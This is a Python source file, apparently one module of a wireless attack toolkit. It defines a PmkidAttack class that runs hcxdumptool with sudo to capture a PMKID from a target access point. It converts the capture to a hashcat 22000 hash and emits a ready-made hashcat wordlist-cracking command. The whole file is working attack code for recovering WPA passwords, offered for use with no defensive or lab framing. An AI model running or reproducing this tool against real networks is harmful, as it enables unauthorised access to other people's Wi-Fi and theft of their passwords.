from core.event_bus import bus
from core.logger import get_logger
import subprocess
import os
import threading
import time

log = get_logger("wifi.pmkid")

CAPTURE_DIR = '/tmp/pmkid'

class PmkidAttack:
    def __init__(self, interface='wlan1'):
        self.interface = interface
        self.running = False
        self._process = None

    def capture(self, bssid: str, timeout: int = 30):
        """Captura PMKID de un AP especifico"""
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        output_file = f"{CAPTURE_DIR}/{bssid.replace(':', '')}"
        hash_file   = f"{output_file}.22000"

        log.info(f"Capturando PMKID de {bssid} por {timeout}s...")
        self.running = True

        # Hilo que detiene la captura al timeout
        def _stop_after():
            time.sleep(timeout)
            self.stop()

        threading.Thread(target=_stop_after, daemon=True).start()

        try:
            self._process = subprocess.Popen(
                ['sudo', 'hcxdumptool',
                 '-i', self.interface,
                 '-o', output_file,
                 '--filterlist_ap', bssid,
                 '--filtermode=2',
                 '--enable_status=1'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self._process.wait()

            # Convertir captura a formato hashcat
            if os.path.exists(output_file):
                subprocess.run(
                    ['hcxpcapngtool', '-o', hash_file, output_file],
                    capture_output=True
                )

            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                log.info(f"PMKID capturado → {hash_file}")
                bus.publish_sync('wifi.pmkid_ready', {
                    'bssid':     bssid,
                    'hash_file': hash_file,
                    'hint':      f"hashcat -m 22000 {hash_file} wordlist.txt",
                })
                return hash_file
            else:
                log.warning(f"No se capturó PMKID de {bssid}")
                bus.publish_sync('wifi.pmkid_failed', {'bssid': bssid})
                return None

        except FileNotFoundError:
            log.error("hcxdumptool no instalado — sudo apt install hcxdumptool")
            return None
        except Exception as e:
            log.error(f"PMKID error: {e}")
            return None
        finally:
            self.running = False

    def stop(self):
        if self._process and self._process.poll() is None:
            self._process.terminate()
            log.info("Captura PMKID detenida.")
        self.running = False
